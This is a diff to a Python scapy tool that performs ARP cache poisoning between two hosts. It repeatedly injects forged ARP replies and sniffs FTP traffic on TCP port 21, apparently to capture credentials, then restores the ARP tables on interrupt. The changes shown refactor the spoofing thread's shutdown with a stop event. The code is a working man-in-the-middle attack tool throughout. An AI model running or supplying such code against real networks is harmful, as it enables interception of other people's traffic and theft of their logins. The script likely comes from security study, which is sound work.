@@ -6,13 +6,21 @@ import time
 import re
 import argparse
 
-def exit_gracefully(args, signum, frame):
+def exit_gracefully(signum, frame, arguments, thread, event):
     print("Wow you want to quit!")
-    packet_source = scapy.ARP(pdst=args.ip_target, hwdst=args.mac_target, psrc=args.ip_src, hwsrc=args.mac_src, op="is-at")
-    packet_target = scapy.ARP(pdst=args.ip_src, hwdst=args.mac_src, psrc=args.ip_target, hwsrc=args.mac_target, op="is-at")
 
-    send_packet(args.mac_target, packet_source)
-    send_packet(args.mac_source, packet_target)
+    event.set()
+    thread.join()
+
+    packet_source = scapy.ARP(pdst=arguments.ipTarget, hwdst=arguments.macTarget, psrc=arguments.ipSource, hwsrc=arguments.macSource, op="is-at")
+    packet_target = scapy.ARP(pdst=arguments.ipSource, hwdst=arguments.macSource, psrc=arguments.ipTarget, hwsrc=arguments.macTarget, op="is-at")
+
+    send_packet(arguments.macTarget, packet_source)
+    send_packet(arguments.macSource, packet_target)
+
+    print(f" --- ARP Table restored at {arguments.ipTarget} --- ", flush=True)
+    print(f" --- ARP Table restored at {arguments.ipSource} --- ", flush=True)
+
 
     exit(0)
 
@@ -56,24 +64,23 @@ def validate_macs(macs: list):
         if re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac) is None:
             raise ValueError("Invalid MAC address")
 
-def spoof(ip_target, mac_target, ip_source, mac_source):
-    while True:
+def spoof(ip_target, mac_target, ip_source, mac_source, stop_event):
+    while not stop_event.is_set():
         inject(ip_target, mac_target, ip_source)
         inject(ip_source, mac_source, ip_target)
-        time.sleep(10)
-
-
+        stop_event.wait(10)
 
 def main(args):
     try:
         validate_ips((args.ipSource, args.ipTarget))
         validate_macs((args.macSource, args.macTarget))
 
-        handler = partial(exit_gracefully, args)
-        signal.signal(signal.SIGINT, handler)
-        
-        thread = threading.Thread(target=spoof, args=(args.ipTarget, args.macTarget, args.ipSource, args.macSource))
+        stop_event = threading.Event()
+        thread = threading.Thread(target=spoof, args=(args.ipTarget, args.macTarget, args.ipSource, args.macSource, stop_event))
         thread.start()
+
+        handler = partial(exit_gracefully, arguments=args, thread=thread, event=stop_event)
+        signal.signal(signal.SIGINT, handler)
 
         scapy.sniff(filter="tcp port 21", prn=packet_processing, store=0)
 
